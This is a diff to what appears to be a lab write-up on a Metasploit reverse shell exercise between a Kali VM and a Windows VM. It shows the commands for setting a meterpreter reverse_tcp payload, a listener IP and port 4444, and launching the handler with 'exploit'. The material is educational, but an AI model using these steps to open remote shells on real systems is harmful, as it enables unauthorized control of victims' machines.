@@ -94,4 +94,6 @@ Next we can setup a multi handler through the command "user exploit/multi/handle
 The defualt payload option is set to generic/shell_reverse_tcp, to change it we can use "set payload windows/x64/meterpreter/reverse_tcp" to match our payload type we previously generated in Notepad.exe.  
 Setting the lhost to our Kali VM IP is required in order to recieve the reverse TCP shell back from the Windows VM, we do this through the command "set lhost 192.168.0.200".  
 To check the setup we can use "options" to view our changes.
-<img width="788" height="517" alt="image" src="https://github.com/user-attachments/assets/0e8d1dc4-30c5-4f80-9540-205f95224d86" />
+Lastly, to launch our reverse TCP listener we can type "exploit" into the terminal to start the handler on our Kali VM IP and our selected port number of 4444.
+<img width="793" height="518" alt="image" src="https://github.com/user-attachments/assets/cebac611-27d5-4fdb-9f5a-a6eee70b96f1" />
+
